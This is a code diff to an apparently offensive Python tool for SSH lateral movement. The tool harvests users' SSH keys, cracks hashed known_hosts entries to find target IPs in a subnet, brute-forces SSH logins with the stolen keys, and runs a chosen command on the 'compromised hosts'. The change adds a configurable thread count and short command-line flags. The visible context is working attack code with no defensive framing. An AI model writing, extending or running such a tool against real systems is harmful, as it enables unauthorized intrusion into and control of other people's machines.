@@ -125,8 +125,9 @@ class CrackThread(threading.Thread) :
 
 class attack(object):
 
-	def __init__(self, cmd):
+	def __init__(self, cmd, threads):
 		self.cmd = cmd
+		self.threads = threads
 
 	def run(self):
 
@@ -134,7 +135,7 @@ class attack(object):
 		credentials = queue.Queue()
 
 		threads = []
-		for i in range(1, len(knownHosts)) : # Number of threads
+		for i in range(1, self.threads) : # Number of threads
 			worker = SSHThread(q, i, credentials, self.cmd) 
 			worker.setDaemon(True)
 			worker.start()
@@ -162,13 +163,14 @@ class attack(object):
 
 class crack_host(object):
 
-	def __init__(self, host_string, subnet):
+	def __init__(self, host_string, subnet, threads):
 		""" crack an encrypted known host """
 
-		self.magic  = host_string.split("|")[1]
-		self.salt   = host_string.split("|")[2]
-		self.hashed = host_string.split("|")[3].split(" ")[0]
-		self.subnet = subnet # TODO
+		self.magic   = host_string.split("|")[1]
+		self.salt    = host_string.split("|")[2]
+		self.hashed  = host_string.split("|")[3].split(" ")[0]
+		self.subnet  = subnet # TODO
+		self.threads = threads
 
 	def run(self):
 
@@ -176,7 +178,7 @@ class crack_host(object):
 		ips         = queue.Queue()
 
 		threads = []
-		for i in range(1, 4) : # Number of threads
+		for i in range(1, self.threads) : # Number of threads
 			worker = CrackThread(q, i, ips, self.magic, self.salt, self.hashed) 
 			worker.setDaemon(True)
 			worker.start()
@@ -243,7 +245,7 @@ def discovery(args):
 							FK = open(home + "/.ssh/known_hosts")
 							for host in FK:
 								if host.find("|") >= 0:
-									crack_obj = crack_host(host, args.crack)
+									crack_obj = crack_host(host, args.crack, args.threads)
 									crack_obj.run()
 							#sys.stdout.write ("\033[92m[*]\033[0m Cracking done.\n")
 
@@ -293,7 +295,7 @@ def discovery(args):
 					open(args.home+homes + "/.ssh/known_hosts")
 					for host in FK:
 						if host.find("|") >= 0:
-							crack_obj = crack_host(host, args.crack)
+							crack_obj = crack_host(host, args.crack, args.threads)
 							crack_obj.run()
 
 				FK.close()
@@ -350,9 +352,10 @@ if __name__ == "__main__":
 
 	parser = argparse.ArgumentParser()
 	parser.add_argument('--home', help='custom home path',default="/home/")
-	parser.add_argument('--run', help='run commands on compromised hosts',default="")
+	parser.add_argument('--run','-r', help='run commands on compromised hosts',default="")
 	parser.add_argument('--no-passwd', dest='passwd', action='store_false', default=True, help='skip passwd check')
-	parser.add_argument('--crack', help='crack hashed known_hosts files',default="",metavar='subnet')
+	parser.add_argument('--crack','-c', help='crack hashed known_hosts files',default="",metavar='subnet')
+	parser.add_argument('--threads','-t', type=int, help='brute-focing threads',default=4)
 	args = parser.parse_args()
 
 	sys.stdout.write ("\033[92m[*]\033[0m enumerating valid users with ssh keys...\n")
@@ -388,7 +391,7 @@ if __name__ == "__main__":
 			sys.stdout.write ("\t"+ host+ "\n")
 
 	sys.stdout.write ("\n\033[92m[*]\033[0m Starting keys bruteforcing...\n")
-	Attack = attack(args.run)
+	Attack = attack(args.run, args.threads)
 
 	Attack.run()
 	sys.stdout.write ("\033[92m[*]\033[0m Attack Complete!\n")
